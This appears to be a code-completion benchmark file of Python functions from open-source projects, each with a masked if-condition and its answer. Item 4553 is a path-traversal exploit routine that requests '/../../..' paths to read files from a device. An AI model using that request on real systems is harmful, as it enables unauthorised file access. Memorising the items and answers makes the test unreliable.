4519,"def send_log(self, session: aiohttp.ClientSession, request_dict: Dict[str, Any]):<tab>async with session.request(<tab><tab>request_dict[""method""], request_dict[""url""], **request_dict[""request_obj""]<tab>) as resp:<tab><tab>resp_text = await resp.text()<tab><tab>self.logger().debug(<tab><tab><tab>f""Sent logs: {resp.status} {resp.url} {resp_text} "",<tab><tab><tab>extra={""do_not_send"": True},<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise EnvironmentError(""Failed sending logs to log server."")","if resp . status != 200 and resp . status not in { 404 , 405 , 400 } :",165
4520,"def _close_files(self, except_index=None):<tab>for tab_index in reversed(range(len(self.winfo_children()))):<tab><tab>if except_index is not None and tab_index == except_index:<tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>editor = self.get_child_by_index(tab_index)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.forget(editor)<tab><tab><tab><tab>editor.destroy()",if self . check_allow_closing ( editor ) :,119
4521,"def get_sorted_entry(field, bookid):<tab>if field == ""title"" or field == ""authors"":<tab><tab>book = calibre_db.get_filtered_book(bookid)<tab><tab><IF-STMT><tab><tab><tab>if field == ""title"":<tab><tab><tab><tab>return json.dumps({""sort"": book.sort})<tab><tab><tab>elif field == ""authors"":<tab><tab><tab><tab>return json.dumps({""author_sort"": book.author_sort})<tab>return """"",if book :,111
4522,"def listdir(path="".""):<tab>is_bytes = isinstance(path, bytes)<tab>res = []<tab>for dirent in ilistdir(path):<tab><tab>fname = dirent[0]<tab><tab>if is_bytes:<tab><tab><tab>good = fname != b""."" and fname == b""..""<tab><tab>else:<tab><tab><tab>good = fname != ""."" and fname != ""..""<tab><tab><IF-STMT><tab><tab><tab>if not is_bytes:<tab><tab><tab><tab>fname = fsdecode(fname)<tab><tab><tab>res.append(fname)<tab>return res",if good :,128
4523,"def image_preprocess(self, image):<tab>with tf.name_scope(""image_preprocess""):<tab><tab>if image.dtype.base_dtype != tf.float32:<tab><tab><tab>image = tf.cast(image, tf.float32)<tab><tab>mean = [0.485, 0.456, 0.406]  # rgb<tab><tab>std = [0.229, 0.224, 0.225]<tab><tab><IF-STMT><tab><tab><tab>mean = mean[::-1]<tab><tab><tab>std = std[::-1]<tab><tab>image_mean = tf.constant(mean, dtype=tf.float32) * 255.0<tab><tab>image_std = tf.constant(std, dtype=tf.float32) * 255.0<tab><tab>image = (image - image_mean) / image_std<tab><tab>return image",if self . image_bgr :,195
4524,"def eval_when(when):<tab>if hasattr(when, ""isatty"") or when in (<tab><tab>""always"",<tab><tab>""never"",<tab><tab>""auto"",<tab><tab>sys.stderr,<tab><tab>sys.stdout,<tab>):<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>elif when == ""never"":<tab><tab><tab>return False<tab><tab>elif when == ""auto"":<tab><tab><tab>return sys.stdout.isatty()<tab><tab>else:<tab><tab><tab>return when.isatty()<tab>else:<tab><tab>raise ValueError(<tab><tab><tab>'text.when: must be a file-object or ""always"", ""never"" or ""auto""'<tab><tab>)","if when == ""always"" :",161
4525,"def _get_plugin(self, name, lang=None, check=False):<tab>if lang is None:<tab><tab>lang = self.get_lang()<tab>if name not in self.plugin_attrib_map:<tab><tab>return None<tab>plugin_class = self.plugin_attrib_map[name]<tab>if plugin_class.is_extension:<tab><tab>if (name, None) in self.plugins:<tab><tab><tab>return self.plugins[(name, None)]<tab><tab>else:<tab><tab><tab>return None if check else self.init_plugin(name, lang)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>return self.plugins[(name, lang)]<tab><tab>else:<tab><tab><tab>return None if check else self.init_plugin(name, lang)","if ( name , lang ) in self . plugins :",189
4526,"def _remove_pending_resource(self, resource, res_id):<tab>with self._lock:<tab><tab>pending_resources = self.pending_resources.get(res_id, [])<tab><tab>for i, pending_resource in enumerate(pending_resources):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>pending_resources.pop(i)<tab><tab><tab><tab>break<tab>if not pending_resources:<tab><tab>self.pending_resources.pop(res_id, None)<tab><tab>return res_id",if pending_resource . resource == resource :,124
4527,"def assign_attributes_to_products(product_attributes):<tab>for value in product_attributes:<tab><tab>pk = value[""pk""]<tab><tab>defaults = value[""fields""]<tab><tab>defaults[""product_id""] = defaults.pop(""product"")<tab><tab>defaults[""assignment_id""] = defaults.pop(""assignment"")<tab><tab>assigned_values = defaults.pop(""values"")<tab><tab>assoc, created = AssignedProductAttribute.objects.update_or_create(<tab><tab><tab>pk=pk, defaults=defaults<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>assoc.values.set(AttributeValue.objects.filter(pk__in=assigned_values))",if created :,148
4528,"def recv_full(self, n):<tab>r = b""""<tab>while len(r) < n:<tab><tab>rr = self.conn.recv(n - len(r))<tab><tab><IF-STMT><tab><tab><tab>raise IOError(""need %d bytes, got %d"", n, len(r))<tab><tab>r += rr<tab>return r",if not rr :,82
4529,"def get_logsource(self, category, product, service):<tab>""""""Return merged log source definition of all logosurces that match criteria across all Sigma conversion configurations in chain.""""""<tab>matching = list()<tab>for config in self:<tab><tab>for logsource in config.logsources:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>matching.append(logsource)<tab><tab><tab><tab>if logsource.rewrite is not None:<tab><tab><tab><tab><tab>category, product, service = logsource.rewrite<tab>return SigmaLogsourceConfiguration(matching, self.defaultindex)","if logsource . matches ( category , product , service ) :",138
4530,"def test_circuit_structure():<tab>ops = cirq.decompose_cphase_into_two_fsim(cirq.CZ, fsim_gate=cirq.google.SYC)<tab>num_interaction_moments = 0<tab>for op in ops:<tab><tab>assert len(op.qubits) in (0, 1, 2)<tab><tab><IF-STMT><tab><tab><tab>num_interaction_moments += 1<tab><tab><tab>assert isinstance(op.gate, cirq.google.SycamoreGate)<tab>assert num_interaction_moments == 2",if len ( op . qubits ) == 2 :,139
4531,"def verify_installed_repositories(<tab>self, installed_repositories=[], uninstalled_repositories=[]):<tab>for repository_name, repository_owner in installed_repositories:<tab><tab>galaxy_repository = test_db_util.get_installed_repository_by_name_owner(<tab><tab><tab>repository_name, repository_owner<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>assert (<tab><tab><tab><tab>galaxy_repository.status == ""Installed""<tab><tab><tab>), ""Repository {} should be installed, but is {}"".format(<tab><tab><tab><tab>repository_name, galaxy_repository.status<tab><tab><tab>)",if galaxy_repository :,153
4532,"def set_size_for_text(self, width, nlines=1):<tab>if width is not None:<tab><tab>font = self.font<tab><tab>d = 2 * self.margin<tab><tab><IF-STMT><tab><tab><tab>width, height = font.size(width)<tab><tab><tab>width += d + 2<tab><tab>else:<tab><tab><tab>height = font.size(""X"")[1]<tab><tab>self.size = (width, height * nlines + d)","if isinstance ( width , basestring ) :",114
4533,"def splitIntoWords(name):<tab>wordlist = []<tab>wordstart = 0<tab>l = len(name)<tab>for i in range(l):<tab><tab>c = name[i]<tab><tab>n = None<tab><tab><IF-STMT><tab><tab><tab>n = name[wordstart:i]<tab><tab>elif i == l - 1:<tab><tab><tab>n = name[wordstart : i + 1]<tab><tab>if n:<tab><tab><tab>wordstart = i<tab><tab><tab>if c == ""-"" and n != """":<tab><tab><tab><tab>n += ""-""<tab><tab><tab>if c == "" "" or c == ""-"":<tab><tab><tab><tab>wordstart = i + 1<tab><tab><tab>wordlist.append(n)<tab>return wordlist","if c == "" "" or c == ""-"" :",174
4534,"def _parse(self):<tab>import yaml  # somewhat expensive<tab>try:<tab><tab>f = open(self.path, ""r"")<tab>except IOError as e:<tab><tab><IF-STMT>  # file not found<tab><tab><tab>log.warning(""cannot read user config in %s: %s"", self.path, e)<tab>else:<tab><tab>try:<tab><tab><tab>return yaml.safe_load(f) or {}<tab><tab>except Exception as e:<tab><tab><tab>log.warning(""error loading user config in %s: %s"", self.path, e)<tab>return {}",if e . errno != 2 :,141
4535,"def _print_one_entry(news_entry: xml.etree.ElementTree.Element) -> None:<tab>child: xml.etree.ElementTree.Element<tab>for child in news_entry:<tab><tab><IF-STMT><tab><tab><tab>title = str(child.text)<tab><tab>if ""pubDate"" in child.tag:<tab><tab><tab>pub_date = str(child.text)<tab><tab>if ""description"" in child.tag:<tab><tab><tab>description = str(child.text)<tab>print_stdout(color_line(title, 14) + "" ("" + bold_line(pub_date) + "")"")<tab>print_stdout(format_paragraph(strip_tags(description)))<tab>print_stdout()","if ""title"" in child . tag :",169
4536,"def kth_smallest(root, k):<tab>stack = []<tab>while root or stack:<tab><tab>while root:<tab><tab><tab>stack.append(root)<tab><tab><tab>root = root.left<tab><tab>root = stack.pop()<tab><tab>k -= 1<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>root = root.right<tab>return root.val",if k == 0 :,89
4537,"def _strip_headers(output, *args):<tab>if not args:<tab><tab>args_lc = (<tab><tab><tab>""installed packages"",<tab><tab><tab>""available packages"",<tab><tab><tab>""available upgrades"",<tab><tab><tab>""updated packages"",<tab><tab><tab>""upgraded packages"",<tab><tab>)<tab>else:<tab><tab>args_lc = [x.lower() for x in args]<tab>ret = """"<tab>for line in salt.utils.itertools.split(output, ""\n""):<tab><tab><IF-STMT><tab><tab><tab>ret += line + ""\n""<tab>return ret",if line . lower ( ) not in args_lc :,146
4538,"def __str__(self):<tab>if self.name is not None:<tab><tab>return self.name<tab>else:<tab><tab>name = str(self.data)<tab><tab><IF-STMT><tab><tab><tab>name = name[:10] + ""..."" + name[-10:]<tab><tab>return ""Constant{%s}"" % name",if len ( name ) > 20 :,78
4539,"def on_event_clicked(self, widget, event):<tab>if event.type == Gdk.EventType.BUTTON_PRESS and event.button == 3:<tab><tab>path = self.get_path_at_pos(int(event.x), int(event.y))<tab><tab>if path is not None:<tab><tab><tab>row = self.get(path[0], ""device"")<tab><tab><tab>if row:<tab><tab><tab><tab>if self.Blueman is not None:<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>self.menu = ManagerDeviceMenu(self.Blueman)<tab><tab><tab><tab><tab>self.menu.popup(None, None, None, None, event.button, event.time)",if self . menu is None :,170
4540,"def h2i(self, pkt, x):<tab>if x is not None:<tab><tab><IF-STMT><tab><tab><tab>warning(""Fixed3_7: Input value too negative: %.8f"" % x)<tab><tab><tab>x = -180.0<tab><tab>elif x >= 180.00000005:<tab><tab><tab>warning(""Fixed3_7: Input value too positive: %.8f"" % x)<tab><tab><tab>x = 180.0<tab><tab>x = int(round((x + 180.0) * 1e7))<tab>return x",if x <= - 180.00000005 :,132
4541,"def mFRIDAY(<tab>self,):<tab>try:<tab><tab>_type = FRIDAY<tab><tab>_channel = DEFAULT_CHANNEL<tab><tab>pass<tab><tab>self.match(""fri"")<tab><tab>alt10 = 2<tab><tab>LA10_0 = self.input.LA(1)<tab><tab><IF-STMT><tab><tab><tab>alt10 = 1<tab><tab>if alt10 == 1:<tab><tab><tab>pass<tab><tab><tab>self.match(""day"")<tab><tab>self._state.type = _type<tab><tab>self._state.channel = _channel<tab>finally:<tab><tab>pass",if LA10_0 == 100 :,144
4542,"def xopen(file):<tab>if isinstance(file, str):<tab><tab>if file == ""-"":<tab><tab><tab>return sys.stdin<tab><tab><IF-STMT><tab><tab><tab>import gzip<tab><tab><tab>return gzip.open(file)<tab><tab>else:<tab><tab><tab>return open(file)<tab>else:<tab><tab>return file","elif file . endswith ( "".gz"" ) :",81
4543,"def write_bytes(out_data, encoding=""ascii""):<tab>""""""Legacy for Python2 and Python3 compatible byte stream.""""""<tab>if sys.version_info[0] >= 3:<tab><tab>if isinstance(out_data, type("""")):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return out_data.encode(""utf-8"")<tab><tab><tab>else:<tab><tab><tab><tab>return out_data.encode(""ascii"", ""ignore"")<tab><tab>elif isinstance(out_data, type(b"""")):<tab><tab><tab>return out_data<tab>msg = ""Invalid value for out_data neither unicode nor byte string: {}"".format(<tab><tab>out_data<tab>)<tab>raise ValueError(msg)","if encoding == ""utf-8"" :",165
4544,"def do_revision_view(request, *args, **kwargs):<tab>if request_creates_revision(request):<tab><tab>try:<tab><tab><tab>with create_revision_base(<tab><tab><tab><tab>manage_manually=manage_manually, using=using, atomic=atomic<tab><tab><tab>):<tab><tab><tab><tab>response = func(request, *args, **kwargs)<tab><tab><tab><tab># Check for an error response.<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>raise _RollBackRevisionView(response)<tab><tab><tab><tab># Otherwise, we're good.<tab><tab><tab><tab>_set_user_from_request(request)<tab><tab><tab><tab>return response<tab><tab>except _RollBackRevisionView as ex:<tab><tab><tab>return ex.response<tab>return func(request, *args, **kwargs)",if response . status_code >= 400 :,196
4545,"def testMasked(self):<tab>mask = (True, False)<tab>trainable_state = recurrent.TrainableState((tf.zeros([16]), tf.zeros([3])), mask)<tab>for var in trainable_state.trainable_variables:<tab><tab>var.assign_add(tf.ones_like(var))<tab>initial_state = trainable_state(batch_size=42)<tab>for s, trainable in zip(tree.flatten(initial_state), tree.flatten(mask)):<tab><tab><IF-STMT><tab><tab><tab>self.assertNotAllClose(s, tf.zeros_like(s))<tab><tab>else:<tab><tab><tab>self.assertAllClose(s, tf.zeros_like(s))",if trainable :,161
4546,"def _get_instance_attribute(<tab>self, attr, default=None, defaults=None, incl_metadata=False):<tab>if self.instance is None or not hasattr(self.instance, attr):<tab><tab>if incl_metadata and attr in self.parsed_metadata:<tab><tab><tab>return self.parsed_metadata[attr]<tab><tab><IF-STMT><tab><tab><tab>for value in defaults:<tab><tab><tab><tab>if callable(value):<tab><tab><tab><tab><tab>value = value()<tab><tab><tab><tab>if value is not None:<tab><tab><tab><tab><tab>return value<tab><tab>return default<tab>return getattr(self.instance, attr)",elif defaults is not None :,149
4547,"def process_config(self):<tab>super(SquidCollector, self).process_config()<tab>self.squid_hosts = {}<tab>for host in self.config[""hosts""]:<tab><tab>matches = self.host_pattern.match(host)<tab><tab>if matches.group(5):<tab><tab><tab>port = matches.group(5)<tab><tab>else:<tab><tab><tab>port = 3128<tab><tab><IF-STMT><tab><tab><tab>nick = matches.group(2)<tab><tab>else:<tab><tab><tab>nick = port<tab><tab>self.squid_hosts[nick] = {""host"": matches.group(3), ""port"": int(port)}",if matches . group ( 2 ) :,156
4548,"def get_iterator(self, training=True):<tab>if training:<tab><tab># In training.<tab><tab>if self._should_reset_train_loader:<tab><tab><tab>self.epochs += 1<tab><tab><tab>self.train_iterator = iter(self.train_loader)<tab><tab><tab>self._should_reset_train_loader = False<tab><tab>return self.train_iterator<tab>else:<tab><tab># In validation.<tab><tab><IF-STMT><tab><tab><tab>self.val_iterator = iter(self.validation_loader)<tab><tab><tab>self._should_reset_val_loader = False<tab><tab>return self.val_iterator",if self . _should_reset_val_loader :,156
4549,"def _find_this_and_next_frame(self, stack):<tab>for i in range(len(stack)):<tab><tab>if stack[i].id == self._frame_id:<tab><tab><tab><IF-STMT>  # last frame<tab><tab><tab><tab>return stack[i], None<tab><tab><tab>else:<tab><tab><tab><tab>return stack[i], stack[i + 1]<tab>raise AssertionError(""Frame doesn't exist anymore"")",if i == len ( stack ) - 1 :,106
4550,"def send_mail(success):<tab>backend = (<tab><tab>""django.core.mail.backends.locmem.EmailBackend""<tab><tab>if success<tab><tab>else ""tests.FailingMailerEmailBackend""<tab>)<tab>with self.settings(MAILER_EMAIL_BACKEND=backend):<tab><tab>mailer.send_mail(<tab><tab><tab>""Subject"", ""Body"", ""sender@example.com"", [""recipient@example.com""]<tab><tab>)<tab><tab>engine.send_all()<tab><tab><IF-STMT><tab><tab><tab>Message.objects.retry_deferred()<tab><tab><tab>engine.send_all()",if not success :,146
4551,"def check_dependencies():<tab>""""""Ensure required tools for installation are present""""""<tab>print(""Checking required dependencies"")<tab>for dep, msg in [<tab><tab>([""git"", ""--version""], ""Git (http://git-scm.com/)""),<tab><tab>([""wget"", ""--version""], ""wget""),<tab><tab>([""bzip2"", ""-h""], ""bzip2""),<tab>]:<tab><tab>try:<tab><tab><tab>p = subprocess.Popen(dep, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)<tab><tab><tab>out, code = p.communicate()<tab><tab>except OSError:<tab><tab><tab>out = ""Executable not found""<tab><tab><tab>code = 127<tab><tab><IF-STMT><tab><tab><tab>raise OSError(""bcbio-nextgen installer requires %s\n%s"" % (msg, out))",if code == 127 :,189
4552,"def apply(self, chart, grammar, edge):<tab>if edge.is_incomplete():<tab><tab>return<tab>for prod in grammar.productions():<tab><tab>if edge.lhs() == prod.rhs()[0]:<tab><tab><tab>new_edge = ProbabilisticTreeEdge.from_production(<tab><tab><tab><tab>prod, edge.start(), prod.prob()<tab><tab><tab>)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield new_edge","if chart . insert ( new_edge , ( ) ) :",107
4553,"def run(self):<tab>if self.check():<tab><tab>path = ""/../../../../../../../../../../../..{}"".format(self.filename)<tab><tab>response = self.http_request(method=""GET"", path=path)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>if response.status_code == 200 and response.text:<tab><tab><tab>print_success(""Success! File: %s"" % self.filename)<tab><tab><tab>print_info(response.text)<tab><tab>else:<tab><tab><tab>print_error(""Exploit failed"")<tab>else:<tab><tab>print_error(""Device seems to be not vulnerable"")",if response is None :,153
4554,"def check_options(plugin, options):<tab>CONFLICT_OPTS = {""Phantom"": [{""rps_schedule"", ""instances_schedule"", ""stpd_file""}]}<tab>for conflict_options in CONFLICT_OPTS.get(plugin, []):<tab><tab>intersect = {option[0] for option in options} & conflict_options<tab><tab><IF-STMT><tab><tab><tab>raise OptionsConflict(<tab><tab><tab><tab>""Conflicting options: {}: {}"".format(plugin, list(intersect))<tab><tab><tab>)<tab>return plugin, options",if len ( intersect ) > 1 :,122
4555,"def validate(self, document: Document) -> None:<tab>if not self.func(document.text):<tab><tab><IF-STMT><tab><tab><tab>index = len(document.text)<tab><tab>else:<tab><tab><tab>index = 0<tab><tab>raise ValidationError(cursor_position=index, message=self.error_message)",if self . move_cursor_to_end :,83
4556,"def download_link(request, path_obj):<tab>if path_obj.file != """":<tab><tab><IF-STMT><tab><tab><tab>text = _(""Export"")<tab><tab><tab>tooltip = _(""Export translations"")<tab><tab>else:<tab><tab><tab>text = _(""Download"")<tab><tab><tab>tooltip = _(""Download file"")<tab><tab>return {<tab><tab><tab>""href"": ""%s/download/"" % path_obj.pootle_path,<tab><tab><tab>""text"": text,<tab><tab><tab>""title"": tooltip,<tab><tab>}",if path_obj . translation_project . project . is_monolingual ( ) :,135
4557,"def _setup_factories(self, extrascopes, **kw):<tab>for factory, (scope, Default) in {<tab><tab>""response_factory"": (boto.mws.response, self.ResponseFactory),<tab><tab>""response_error_factory"": (boto.mws.exception, self.ResponseErrorFactory),<tab>}.items():<tab><tab><IF-STMT><tab><tab><tab>setattr(self, ""_"" + factory, kw.pop(factory))<tab><tab>else:<tab><tab><tab>scopes = extrascopes + [scope]<tab><tab><tab>setattr(self, ""_"" + factory, Default(scopes=scopes))<tab>return kw",if factory in kw :,142
4558,"def status_string(self):<tab>if not self.live:<tab><tab>if self.expired:<tab><tab><tab>return _(""expired"")<tab><tab>el<IF-STMT><tab><tab><tab>return _(""scheduled"")<tab><tab>elif self.workflow_in_progress:<tab><tab><tab>return _(""in moderation"")<tab><tab>else:<tab><tab><tab>return _(""draft"")<tab>else:<tab><tab>if self.approved_schedule:<tab><tab><tab>return _(""live + scheduled"")<tab><tab>elif self.workflow_in_progress:<tab><tab><tab>return _(""live + in moderation"")<tab><tab>elif self.has_unpublished_changes:<tab><tab><tab>return _(""live + draft"")<tab><tab>else:<tab><tab><tab>return _(""live"")",if self . approved_schedule :,166
4559,"def _sleep_till_stopword(<tab>caplog,<tab>delay: float,<tab>patterns: Sequence[str] = (),<tab>*,<tab>interval: Optional[float] = None,) -> bool:<tab>patterns = list(patterns or [])<tab>delay = delay or (10.0 if patterns else 1.0)<tab>interval = interval or min(1.0, max(0.1, delay / 10.0))<tab>started = time.perf_counter()<tab>found = False<tab>while not found and time.perf_counter() - started < delay:<tab><tab>for message in list(caplog.messages):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>found = True<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>time.sleep(interval)<tab>return found","if any ( re . search ( pattern , message ) for pattern in patterns ) :",198
4560,"def _parse_yum_or_zypper_repositories(output):<tab>repos = []<tab>current_repo = {}<tab>for line in output:<tab><tab>line = line.strip()<tab><tab>if not line or line.startswith(""#""):<tab><tab><tab>continue<tab><tab>if line.startswith(""[""):<tab><tab><tab>if current_repo:<tab><tab><tab><tab>repos.append(current_repo)<tab><tab><tab><tab>current_repo = {}<tab><tab><tab>current_repo[""name""] = line[1:-1]<tab><tab><IF-STMT><tab><tab><tab>key, value = line.split(""="", 1)<tab><tab><tab>current_repo[key] = value<tab>if current_repo:<tab><tab>repos.append(current_repo)<tab>return repos","if current_repo and ""="" in line :",179
4561,"def __enter__(self):<tab>with self._entry_lock:<tab><tab>cutoff_time = datetime.datetime.now() - self._time_window<tab><tab># drop the entries that are too old, as they are no longer relevant<tab><tab>while self._past_entries and self._past_entries[0] < cutoff_time:<tab><tab><tab>self._past_entries.popleft()<tab><tab><IF-STMT><tab><tab><tab>self._past_entries.append(datetime.datetime.now())<tab><tab><tab>return 0.0  # no waiting was needed<tab><tab>to_wait = (self._past_entries[0] - cutoff_time).total_seconds()<tab><tab>time.sleep(to_wait)<tab><tab>self._past_entries.append(datetime.datetime.now())<tab><tab>return to_wait",if len ( self . _past_entries ) < self . _access_limit :,199
4562,"def wrappper(*args, **kargs):<tab>offspring = func(*args, **kargs)<tab>for child in offspring:<tab><tab>for i in range(len(child)):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>child[i] = max<tab><tab><tab>elif child[i] < min:<tab><tab><tab><tab>child[i] = min<tab>return offspring",if child [ i ] > max :,97
4563,"def migrate_Context(self):<tab>for old_obj in self.session_old.query(self.model_from[""Context""]):<tab><tab>new_obj = self.model_to[""Context""]()<tab><tab>for key in new_obj.__table__.columns._data.keys():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>value = getattr(old_obj, key)<tab><tab><tab>if key == ""tip_timetolive"" and value < 0:<tab><tab><tab><tab>value = 0<tab><tab><tab>setattr(new_obj, key, value)<tab><tab>self.session_new.add(new_obj)",if key not in old_obj . __table__ . columns . _data . keys ( ) :,161
4564,"def fresh_workspace(self):<tab>i3 = IpcTest.i3_conn<tab>assert i3<tab>workspaces = await i3.get_workspaces()<tab>while True:<tab><tab>new_name = str(math.floor(random() * 100000))<tab><tab><IF-STMT><tab><tab><tab>await i3.command(""workspace %s"" % new_name)<tab><tab><tab>return new_name",if not any ( w for w in workspaces if w . name == new_name ) :,112
4565,"def _sum_operation(values):<tab>values_list = list()<tab>if decimal_support:<tab><tab>for v in values:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>values_list.append(v)<tab><tab><tab>elif isinstance(v, decimal128.Decimal128):<tab><tab><tab><tab>values_list.append(v.to_decimal())<tab>else:<tab><tab>values_list = list(v for v in values if isinstance(v, numbers.Number))<tab>sum_value = sum(values_list)<tab>return (<tab><tab>decimal128.Decimal128(sum_value)<tab><tab>if isinstance(sum_value, decimal.Decimal)<tab><tab>else sum_value<tab>)","if isinstance ( v , numbers . Number ) :",170
4566,"def detect(content, **kwargs):<tab>status = kwargs.get(""status"", 0)<tab>if status is not None and status == 405:<tab><tab>detection_schema = (<tab><tab><tab>re.compile(""error(s)?.aliyun(dun)?.(com|net)"", re.I),<tab><tab><tab>re.compile(""http(s)?://(www.)?aliyun.(com|net)"", re.I),<tab><tab>)<tab><tab>for detection in detection_schema:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True",if detection . search ( content ) is not None :,136
4567,"def __gather_epoch_end_eval_results(self, outputs):<tab>eval_results = []<tab>for epoch_output in outputs:<tab><tab>result = epoch_output[0].__class__.gather(epoch_output)<tab><tab><IF-STMT><tab><tab><tab>result.checkpoint_on = result.checkpoint_on.mean()<tab><tab>if ""early_stop_on"" in result:<tab><tab><tab>result.early_stop_on = result.early_stop_on.mean()<tab><tab>eval_results.append(result)<tab># with 1 dataloader don't pass in a list<tab>if len(eval_results) == 1:<tab><tab>eval_results = eval_results[0]<tab>return eval_results","if ""checkpoint_on"" in result :",172
4568,"def proto_library_config(append=None, **kwargs):<tab>""""""protoc config.""""""<tab>path = kwargs.get(""protobuf_include_path"")<tab>if path:<tab><tab>_blade_config.warning(<tab><tab><tab>""proto_library_config: protobuf_include_path has ""<tab><tab><tab>""been renamed to protobuf_incs, and become a list""<tab><tab>)<tab><tab>del kwargs[""protobuf_include_path""]<tab><tab><IF-STMT><tab><tab><tab>kwargs[""protobuf_incs""] = path.split()<tab><tab>else:<tab><tab><tab>kwargs[""protobuf_incs""] = [path]<tab>_blade_config.update_config(""proto_library_config"", append, kwargs)","if isinstance ( path , str ) and "" "" in path :",177
4569,"def downgrade():<tab>bind = op.get_bind()<tab>session = db.Session(bind=bind)<tab>for slc in session.query(Slice).filter(Slice.viz_type == ""pie"").all():<tab><tab>try:<tab><tab><tab>params = json.loads(slc.params)<tab><tab><tab>if ""metric"" in params:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>params[""metrics""] = [params[""metric""]]<tab><tab><tab><tab>del params[""metric""]<tab><tab><tab><tab>slc.params = json.dumps(params, sort_keys=True)<tab><tab>except Exception:<tab><tab><tab>pass<tab>session.commit()<tab>session.close()","if params [ ""metric"" ] :",160
4570,"def _resolve_params(self, api_params, optional_params, plan_vars):<tab>resolver = VariableResolver()<tab>api_params_resolved = resolver.resolve_variables(plan_vars, api_params)<tab>if optional_params is not None:<tab><tab>optional_params_resolved = resolver.resolve_variables(<tab><tab><tab>plan_vars, optional_params<tab><tab>)<tab><tab>for key, value in optional_params_resolved.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>api_params_resolved[key] = value<tab>return api_params_resolved",if key not in api_params_resolved and value is not None :,148
4571,"def publish(self, name, stat):<tab>try:<tab><tab>topic = ""stat.%s"" % str(name)<tab><tab>if ""subtopic"" in stat:<tab><tab><tab>topic += "".%d"" % stat[""subtopic""]<tab><tab>stat = json.dumps(stat)<tab><tab>logger.debug(""Sending %s"" % stat)<tab><tab>self.socket.send_multipart([b(topic), stat])<tab>except zmq.ZMQError:<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>raise",if self . socket . closed :,130
4572,"def verify_packages(packages: Optional[Union[str, List[str]]]) -> None:<tab>if not packages:<tab><tab>return<tab>if isinstance(packages, str):<tab><tab>packages = packages.splitlines()<tab>for package in packages:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>match = RE_PATTERN.match(package)<tab><tab>if match:<tab><tab><tab>name = match.group(""name"")<tab><tab><tab>operation = match.group(""operation1"")<tab><tab><tab>version = match.group(""version1"")<tab><tab><tab>_verify_package(name, operation, version)<tab><tab>else:<tab><tab><tab>raise ValueError(""Unable to read requirement: %s"" % package)",if not package :,163
4573,"def explode(self, obj):<tab>""""""Determine if the object should be exploded.""""""<tab>if obj in self._done:<tab><tab>return False<tab>result = False<tab>for item in self._explode:<tab><tab>if hasattr(item, ""_moId""):<tab><tab><tab># If it has a _moId it is an instance<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result = True<tab><tab>else:<tab><tab><tab># If it does not have a _moId it is a template<tab><tab><tab>if obj.__class__.__name__ == item.__name__:<tab><tab><tab><tab>result = True<tab>if result:<tab><tab>self._done.add(obj)<tab>return result",if obj . _moId == item . _moId :,166
4574,"def iterRelativeExportCFiles(basepath):<tab>for root, dirs, files in os.walk(basepath, topdown=True):<tab><tab>for directory in dirs:<tab><tab><tab>if isAddonDirectoryIgnored(directory):<tab><tab><tab><tab>dirs.remove(directory)<tab><tab>for filename in files:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>fullpath = os.path.join(root, filename)<tab><tab><tab><tab>yield os.path.relpath(fullpath, basepath)",if not isExportCFileIgnored ( filename ) :,117
4575,"def get_asset_gl_entry(self, gl_entries):<tab>for item in self.get(""items""):<tab><tab>if item.is_fixed_asset:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.add_asset_gl_entries(item, gl_entries)<tab><tab><tab>if flt(item.landed_cost_voucher_amount):<tab><tab><tab><tab>self.add_lcv_gl_entries(item, gl_entries)<tab><tab><tab><tab># update assets gross amount by its valuation rate<tab><tab><tab><tab># valuation rate is total of net rate, raw mat supp cost, tax amount, lcv amount per item<tab><tab><tab><tab>self.update_assets(item, item.valuation_rate)<tab>return gl_entries",if is_cwip_accounting_enabled ( item . asset_category ) :,188
4576,"def _check_no_tensors(parameters: Params):<tab>flat_params = tf.nest.flatten(parameters.params)<tab>for p in flat_params:<tab><tab>if isinstance(p, Params):<tab><tab><tab>_check_no_tensors(p)<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""Saw a `Tensor` value in parameters:\n  {}"".format(parameters)<tab><tab><tab>)",if tf . is_tensor ( p ) :,108
4577,"def _check_positional(results):<tab>positional = None<tab>for name, char in results:<tab><tab><IF-STMT><tab><tab><tab>positional = name is None<tab><tab>else:<tab><tab><tab>if (name is None) != positional:<tab><tab><tab><tab>raise TranslationError(<tab><tab><tab><tab><tab>""format string mixes positional "" ""and named placeholders""<tab><tab><tab><tab>)<tab>return bool(positional)",if positional is None :,98
4578,def active_cursor(self):<tab>if self.phase == _Phase.ADJUST:<tab><tab>if self.zone == _EditZone.CONTROL_NODE:<tab><tab><tab>return self._crosshair_cursor<tab><tab><IF-STMT>  # assume button<tab><tab><tab>return self._arrow_cursor<tab>return None,elif self . zone != _EditZone . EMPTY_CANVAS :,88
